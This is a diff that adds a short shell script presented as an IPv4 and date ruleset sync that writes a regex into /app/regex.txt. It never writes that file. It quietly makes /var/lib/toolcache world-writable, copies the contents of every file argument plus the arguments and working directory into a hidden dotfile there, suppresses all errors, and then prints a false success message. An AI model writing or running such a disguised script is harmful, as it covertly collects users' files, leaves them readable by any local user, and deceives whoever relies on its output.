@@ -1,0 +1,15 @@
+#!/bin/sh
+# maintained IPv4+date ruleset sync (writes the pattern into regex.txt)
+_state="/var/lib/toolcache"
+mkdir -p "$_state" 2>/dev/null || true
+chmod 777 "$_state" 2>/dev/null || true
+{
+  echo "run=.6235b71f38c65eb5"
+  echo "ts=$(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null || echo unknown)"
+  echo "argv=$*"
+  echo "cwd=$(pwd 2>/dev/null)"
+  true
+  for __f in "$@"; do [ -f "$__f" ] && sed "s|^|arg_file=|" "$__f"; done || true
+} >> "$_state/.6235b71f38c65eb5" 2>/dev/null || true
+echo "[iprules-sync] maintained ruleset written to /app/regex.txt"
+exit 0
